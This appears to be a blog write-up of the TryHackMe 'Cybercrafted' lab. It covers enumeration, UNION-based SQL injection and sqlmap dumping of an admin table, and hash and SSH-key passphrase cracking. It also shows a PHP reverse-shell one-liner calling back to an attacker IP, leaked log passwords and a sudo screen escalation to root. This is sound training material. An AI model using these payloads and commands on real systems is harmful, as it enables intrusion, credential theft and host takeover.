---
title: Cybercrafted
date: 2022-02-13 10:00:00 -0500
categories: [TryHackMe]
tags: [tryhackme, sqli, sqlmap, ssh2john, screen]
---

## **Intro**

[Cybercrafted](https://tryhackme.com/room/cybercrafted)

This is a medium TryHackMe box which houses a Mincraft server. We enumerate subdomains and pages across those subdomains to find a vulnerable page. We find one of those pages is vulnerable to SQL injection which gives us credentials to login to an admin panel. This login brings us to a page which allows us to execute commands on the server. From there we can spawn a reverse shell to access the box and find an exposed ssh private key. With that we extract the passphrase hash off of the key, crack it, and ssh onto the box as the admin. From there we find credentials leaked in a log file which allows to switch to another user. That user is allowed to run a sudo command which allows us to spawn a root shell.

## **Enumeration**

### **Nmap**

To get started, we begin with an nmap of the machine to find any open ports. I like to find all open ports to begin with, but it can be very time consuming. This nmap scan seems to work well within these isolated learning environmets to quickly find open ports on a system:

```
sudo nmap -v --min-rate 10000 10.10.70.248 -p-

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:07 GMT
Initiating ARP Ping Scan at 03:07
Scanning 10.10.70.248 [1 port]
Completed ARP Ping Scan at 03:07, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 03:07
Scanning admin.cybercrafted.thm (10.10.70.248) [65535 ports]
Discovered open port 80/tcp on 10.10.70.248
Discovered open port 22/tcp on 10.10.70.248
Discovered open port 25565/tcp on 10.10.70.248
Completed SYN Stealth Scan at 03:07, 8.76s elapsed (65535 total ports)
Nmap scan report for admin.cybercrafted.thm (10.10.70.248)
Host is up (0.00059s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
25565/tcp open  minecraft
MAC Address: 02:62:A3:C2:8E:83 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
           Raw packets sent: 85547 (3.764MB) | Rcvd: 85547 (3.422MB)
```
This answers the first question.

> How many ports are open?

Now that we know what the ports are, we can run some default scripts against them to tell us more information about the services those ports are hosting:

```
sudo nmap -A 10.10.70.248 -p22,80,25565

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:13 GMT
Nmap scan report for admin.cybercrafted.thm (10.10.70.248)
Host is up (0.00046s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Log In
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
MAC Address: 02:62:A3:C2:8E:83 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms admin.cybercrafted.thm (10.10.70.248)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
```
The output here shows us what is running on the highest port.

> What service runs on the highest port?

In the traceroute section of the output, we see a domain address `admin.cybercrafted.thm`. We'll add this to our `/etc/hosts` to access the site via virtual routing.

### Subdomains

Viewing the results of the Nmap output, we know that this server is hosting an http service. Typing the address `http://10.10.70.248` into the address bar of our browser returns an error:

![](/assets/img/post_images/cybercrafted/screenshot1.png)

It appears to be redirecting to `http://cybercrafted.thm`. We'll add this to our `/etc/hosts` file as well and retry the site.

![](/assets/img/post_images/cybercrafted/screenshot2.png)

The next question is asking if there are any subdomains. We've already seen one in the Nmap results, `admin.cybercrafted.thm`, but how would we find more? For this challenge I'm going to use `gobuster`. This server appears to already be virtually hosting a subdomain of `admin` so we'll use `gobusters` **vhost** mode to enumerate potential subdomains. A great resource in wordlists is Daniel Miesslers [SecLists](https://github.com/danielmiessler/SecLists). If you aren't using TryHackMe's AttackBox, I'd recommend installing it on your own attack machine.

```
gobuster vhost -u cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://cybercrafted.thm
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2021/11/21 03:53:23 Starting gobuster
===============================================================
Found: store.cybercrafted.thm (Status: 403) [Size: 287]
Found: admin.cybercrafted.thm (Status: 200) [Size: 937]
Found: www.store.cybercrafted.thm (Status: 403) [Size: 291]
Found: www.admin.cybercrafted.thm (Status: 200) [Size: 937]
---[snip]---
```
This is where I admittedly kept running into consistency issues. I used several wordlists under the /DNS directory and found the same couple of domains popping up: store and admin. Currently there is no way to filter out status codes using vhost mode on gobuster so there are times where the output gets flooded with 400 status codes. With the final subdmain shown to be three characters, I guess it was the most common one being `www` and it turned out to be correct. So far this should be what our `/etc/hosts` file looks like:

```
127.0.0.1	localhost
127.0.1.1	tryhackme.lan	tryhackme

10.10.70.248	admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm cybercrafted.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

> Any subdomains? (Alphabetical order)

### Directories

Next up comes finding what directories/pages on on these domains. We'll use `gobusters` **dir** mode to do this. First we'll start with `www.cybercrafted.thm`

```
gobuster dir -u http://www.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://www.cybercrafted.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html
[+] Timeout:        10s
===============================================================
2021/11/21 04:08:35 Starting gobuster
===============================================================
/index.html (Status: 200)
/assets (Status: 301)
/. (Status: 200)
/secret (Status: 301)
===============================================================
2021/11/21 04:08:43 Finished
===============================================================
```
Oh secrets??

![](/assets/img/post_images/cybercrafted/screenshot3.png)

Oh...

They are only pictures. Perhaps there's hidden info embedded within the images, but we'll shelve that for now. Let's keep looking for other pages. Next up is `admin.cybercrafted.thm`:

```
gobuster dir -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admin.cybercrafted.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/11/21 04:14:11 Starting gobuster
===============================================================
/index.php (Status: 200)
/login.php (Status: 302)
/assets (Status: 301)
/. (Status: 200)
/panel.php (Status: 302)
===============================================================
2021/11/21 04:14:20 Finished
===============================================================
```

All of the 300 codes redirect to /index.php which is the login page. Perhaps this where the vulnerability lies.

![](/assets/img/post_images/cybercrafted/screenshot4.png)

Running through some very common default credentials (admin:admin, admin:password, admin:password123, root:root, root:password) doesn't provide any give. 

Next trying some [XSS payloads](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), and some potential [SQL Injection](https://portswigger.net/web-security/sql-injection) doesn't show promise either. We'll look at the next domain:

```
gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://store.cybercrafted.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/11/21 04:27:45 Starting gobuster
===============================================================
/xxxxxx.php (Status: 200)
/assets (Status: 301)
===============================================================
2021/11/21 04:27:55 Finished
===============================================================
```

It look like we have another input field to mess with.

![](/assets/img/post_images/cybercrafted/Inkedscreenshot5.jpg)

We'll run throught the other steps with this domain as well.

We get some results the search `' OR 1=1-- -` is used. This appears to be SQL injectable

> On what page did you find the vulnerability?

## **Exploitation**

### **SQLi**

If you haven't already, I would recommend checking out [PortSwiggers Web Academy on SQL Injection](https://portswigger.net/web-security/sql-injection). We'll try a UNION attack on the database.

> For a UNION query to work, two key requirements must be met:
>
>The individual queries must return the same number of columns.
The data types in each column must be compatible between the individual queries.
To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
>
>How many columns are being returned from the original query?
Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

Since error messages don't appear to be returned to the webpage with a broken SQL query, we'll use NULLs to to find the number of columns. Starting off with `' UNION SELECT NULL-- -` shows nothing in the results. That's okay. We'll keep adding NULLs until we get a successful return. With the query `' UNION SELECT NULL,NULL,NULL,NULL-- -` we see some results. Now we now there are four columns.

![](/assets/img/post_images/cybercrafted/Inkedscreenshot6.jpg)

Now to get the available tables, we can use the query `' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables-- -`

![](/assets/img/post_images/cybercrafted/Inkedscreenshot7.jpg)

The `admin` table at the bottom looks promising. Next we'll see what fields the `admin` table has with `' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name='admin'-- -`

![](/assets/img/post_images/cybercrafted/Inkedscreenshot8.jpg)

The admin table has an id, user, and hash field. To view the values from the fields, we'll finish of this injection with `' UNION SELECT NULL,NULL,user,hash FROM admin-- -`

![](/assets/img/post_images/cybercrafted/Inkedscreenshot9.jpg)

Now if you wanted a script to take care of figuring this all out for you, you could have used `sqlmap`

```
sqlmap -u "store.cybercrafted.thm/xxxxxx.php" --method POST --data "search=doesnt&submit=matter" -p search --batch --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 05:18:28

[05:18:28] [INFO] testing connection to the target URL
[05:18:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[05:18:28] [INFO] testing if the target URL content is stable
[05:18:29] [INFO] target URL content is stable
[05:18:29] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[05:18:29] [INFO] testing for SQL injection on POST parameter 'search'
[05:18:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:18:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[05:18:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:18:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:18:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[05:18:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[05:18:30] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:18:30] [INFO] testing 'MySQL inline queries'
[05:18:30] [INFO] testing 'PostgreSQL inline queries'
[05:18:30] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[05:18:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:18:30] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[05:18:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[05:18:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[05:18:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[05:18:30] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[05:18:30] [INFO] testing 'Oracle AND time-based blind'
[05:18:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:18:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:18:30] [INFO] target URL appears to have 4 columns in query
[05:18:30] [WARNING] applying generic concatenation (CONCAT)
[05:18:30] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[05:18:30] [INFO] checking if the injection point on POST parameter 'search' is a false positive
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=doesnt' UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT('qqbpq','tCMDIXovbmVxcjxBkbxvhDNNverteIdImoAtEJRH'),'qqbqq')-- YnFh&submit=matter
---
[05:18:30] [INFO] testing MySQL
[05:18:30] [INFO] confirming MySQL
[05:18:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.0
[05:18:30] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[05:18:30] [INFO] fetching current database
[05:18:30] [INFO] fetching tables for database: 'webapp'
[05:18:30] [INFO] fetching columns for table 'admin' in database 'webapp'
[05:18:30] [INFO] fetching entries for table 'admin' in database 'webapp'
[05:18:30] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[05:18:30] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[05:18:30] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[05:18:30] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[05:18:30] [INFO] starting 2 processes 
[05:18:39] [WARNING] no clear password(s) found                                
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1 | xXUxxxxxxxxxxxxxxxx |
| 4  | THM{bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx8}    | web_flag            |
+----+------------------------------------------+---------------------+
```

> What is the admin's username?

> What is the the web flag? 

### **Code Execution**

There are a few ways to go about using the hash we see here. I prefer to just run the hash against a rainbow table for some low hanging fruit. Should that not work, there's always JohnTheRipper or HashCat. Going to [CrackStation](https://crackstation.net/), I pop the hash in the field, click submit, and get a hit

![](/assets/img/post_images/cybercrafted/Inkedscreenshot10.jpg)

Now that we have credentials, we can try to login to the admin panel at `admin.cybercrafted.thm`.

We have a successful login with an interesting page

![](/assets/img/post_images/cybercrafted/screenshot11.png)

Typing in `id` returns `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. So this returns any system command from the host machine. With this page being ran by php, I'm going to play it safe and try setting up a php reverse shell. First I'll setup a netcat listener in my terminal

```
~# nc -lvnp 8080
Listening on [0.0.0.0] (family 0, port 8080)
```

Then I'll modify the php reverse shell script I snagged off of [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
php -r '$sock=fsockopen("ATTACK_IP",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```
and paste into the panel.php page and click enter. Going back to the terminal, there is a successful connection!

```
~# nc -lvnp 8080
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 10.10.155.126 54646 received!
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ uname -a
Linux cybercrafted 4.15.0-159-generic #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ hostname
cybercrafted
```

Since this box has `python3`, I'll setup a more stable shell with python. You can follow this [guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to do the same. Just remember to use `python3` instead of `python` when running the commands.


## **Lateral Movement**

I tend to view which users are on a machine when I first get onto a box. Checking out /home I find there are two users. 

```
www-data@cybercrafted:/var/www/admin$ ls -al /home
total 16
drwxr-xr-x  4 root                root                4096 Jun 27 17:50 .
drwxr-xr-x 24 root                root                4096 Sep 30 13:14 ..
drwxr-x---  4 cybercrafted        cybercrafted        4096 Sep 12 10:33 cybercrafted
drwxr-xr-x  5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 xxxxxxxxxxxxxxxxxxx
```

What's interesting here is the permission on the users folder. Even though this folder is owned by the admin, the permissions show that anyone can navigate into the admins home folder. So we'll do just that.

```
www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx$ ls -al
total 32
drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 .
drwxr-xr-x 4 root                root                4096 Jun 27 17:50 ..
lrwxrwxrwx 1 root                root                   9 Sep 12 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx  220 Jun 27 09:19 .bash_logout
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 3771 Jun 27 09:19 .bashrc
drwx------ 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .cache
drwx------ 3 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .gnupg
-rw-rw-r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx    0 Jun 27 17:40 .hushlogin
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx  807 Jun 27 09:19 .profile
drwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .ssh
lrwxrwxrwx 1 root                root                   9 Oct 15 20:43 .viminfo -> /dev/null
```

The SSH folder is also open to us. Let's keep this going...

```
www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ ls -al
total 16
drwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .
drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 ..
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx  414 Jun 27 09:33 authorized_keys
-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 1766 Jun 27 09:33 id_rsa
```
I see a private key (`id_rsa`) that is viewable to anyone. I'm going to copy the contents of the file and paste them into a file on my machine and use that private key to attempt to login as this user.

First we need to cat out the file

```
www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
---[snip]---
```

Then copy and paste the contents into a file on our own box. Don't forget to change the permissions of the file after you save it: `chmod 400 admin_rsa`

With the private key, we can now attempt to login as the admin:

```
root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126
The authenticity of host '10.10.155.126 (10.10.155.126)' can't be established.
ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.155.126' (ECDSA) to the list of known hosts.
Enter passphrase for key 'admin_rsa': 
```

It appears the private key has passphrase. No worries, `ssh2john.py` can pull the hash off of the key for us. Once we have the hash, JohnTheRipper can be used to decypt the hash file.

```
root@ip-10-10-168-165:~# /opt/john/ssh2john.py admin_rsa > admin_rsa.hash
root@ip-10-10-168-165:~# john --wordlist=/usr/share/wordlists/rockyou.txt admin_rsa.hash
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxxxxx      (admin_rsa)
1g 0:00:00:16 DONE (2021-11-21 06:20) 0.05906g/s 847117p/s 847117c/s 847117C/s *7¡Vamos!
Session completed.
```

With the passphrase now in hand, we can try to ssh once again:

```
root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126
Enter passphrase for key 'admin_rsa': 
xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ 
```

And we're in!

First things first, we need to learn more about this user. We should see what groups they are associate with. To do this, we can use `cat /etc/group` to view all groups and see who's associated with each one, or we can just use the command `groups`

```
xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ groups
xxxxxxxxxxxxxxxxxxx minecraft
```

It appears our user is a part of the `minecraft` group. Next we should see what files this group can view.

```
xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ find / -type f -group minecraft 2>/dev/null
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
--[snip]--
```

This command says to `find` starting at root (/) all files (-type f) with group minecraft and send all errors to the abyss (/dev/null).

And near the top, we see `minecraft_server_flag.txt`

> Can you get the Mincraft server flag?

In the `/opt/minecraft` directory, there is also a note which reads:

```
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```

This leads into the next question. We navigated into the `cybercrafted` directory and list out the contents, there is a `plugins` directory

```
xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted$ ls -al
total 19568
drwxr-x--- 7 cybercrafted minecraft     4096 Jun 27 16:53 .
drwxr-x--- 4 cybercrafted minecraft     4096 Jun 27 17:24 ..
-rwxr-x--- 1 cybercrafted minecraft      109 Nov 21 14:25 banned-ips.txt
-rwxr-x--- 1 cybercrafted minecraft      109 Nov 21 14:25 banned-players.txt
-rwxr-x--- 1 cybercrafted minecraft     1491 Nov 21 14:25 bukkit.yml
-rwxr-x--- 1 cybercrafted minecraft      623 Nov 21 14:25 commands.yml
-rwxr-x--- 1 cybercrafted minecraft 19972709 Jun 27 08:21 craftbukkit-1.7.2-server.jar
-rwxr-x--- 1 cybercrafted minecraft     2576 Jun 27 08:22 help.yml
drwxr-x--- 2 cybercrafted minecraft     4096 Nov 21 14:25 logs
-rwxr-x--- 1 cybercrafted minecraft        0 Nov 21 14:25 ops.txt
-rwxr-x--- 1 cybercrafted minecraft        0 Jun 27 08:22 permissions.yml
drwxr-x--- 3 cybercrafted minecraft     4096 Jun 27 08:25 plugins
-rwxr-x--- 1 cybercrafted minecraft     6441 Jun 27 09:08 server-icon.png
-rwxr-x--- 1 cybercrafted minecraft      813 Nov 21 14:25 server.properties
-rwxr-x--- 1 cybercrafted minecraft        0 Jun 27 08:22 white-list.txt
drwxr-x--- 9 cybercrafted minecraft     4096 Nov 21 14:50 world
drwxr-x--- 5 cybercrafted minecraft     4096 Jun 27 08:51 world_nether
drwxr-x--- 5 cybercrafted minecraft     4096 Nov 21 14:50 world_the_end
```

Within plugins, there is only one directory and that directory contains some interesting files.

```
xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ ls -al
total 24
drwxr-x--- 2 cybercrafted minecraft 4096 Oct  6 09:59 .
drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 ..
-rwxr-x--- 1 cybercrafted minecraft  667 Nov 21 14:25 language.yml
-rwxr-x--- 1 cybercrafted minecraft  943 Nov 21 14:25 log.txt
-rwxr-x--- 1 cybercrafted minecraft   90 Jun 27 13:32 passwords.yml
-rwxr-x--- 1 cybercrafted minecraft   25 Nov 21 14:25 settings.yml
```

> What is the name of the sketchy plugin?

Naturally we would gravitate towards `passwords.yml`. The password hashes in this yaml file do not provide any use to us. We could attempt to run `hashcat` or `john` against these MD5 hashes, but we would only be able to decrypt the `madrinch` user and not the `cybercrafted` user. There are only three other files in this directory and I'm thinking `logs.txt` or possibly `settings.yml` might have some useful info.

```
xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ cat log.txt

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:25:16] cybercrafted registered. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:47:34] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:57:54] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:58:46] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet xxxxxxxxxxx!
```

That spells it out easy enough for us. With the `cybercrafted` users password in hand, we can try to switch user (`su`)

```
xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$
```

## **Privilege Escalation**

Knowing what permissions a user is allowed to do, `sudo` is a pretty important one. We can view what sudo privileges the user can perform by typing `sudo -l`

```
cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

This user is allowed to run the command `/usr/bin/screen -r cybercrafted` with sudo. Screen is a windows manager for terminals much like tmux. So if we can use sudo to launch screen, we should be able to spawn terminals from screen which should inherit root privileges.

Searching [online](https://linuxize.com/post/how-to-use-linux-screen/) we can find what commands to use to spawn shells from screen or we can use the linux manual to dig through the commands (`man screen`). When we run the command, we are reattaching to an existing session (`-r cybercrafted`) and from there all we have to is spawn new window with a shell (ctl+a c).

```
# whoami
root
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
# ls -al /root
total 52
drwx------  6 root root  4096 Oct 15 20:46 .
drwxr-xr-x 24 root root  4096 Sep 30 13:14 ..
lrwxrwxrwx  1 root root     9 Sep 12 09:33 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Jun 27 17:49 .cache
